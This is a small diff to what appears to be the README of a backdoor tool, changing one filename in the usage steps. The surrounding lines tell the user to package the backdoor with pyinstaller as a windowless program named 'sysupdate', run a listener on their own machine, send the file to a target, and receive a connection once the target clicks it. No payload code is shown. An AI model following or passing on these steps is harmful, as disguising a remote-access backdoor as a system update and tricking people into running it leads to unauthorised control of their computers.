@@ -49,7 +49,7 @@ pyinstaller --onefile --noconsole --name "sysupdate" --icon="icon.png" --add-dat
 
 4. ### Run Listener is your machine and send the backdoor to target
 ```zsh
-python listeenr.py
+python listner.py
 ```
  when target clicks backdoor, you get the connection
  
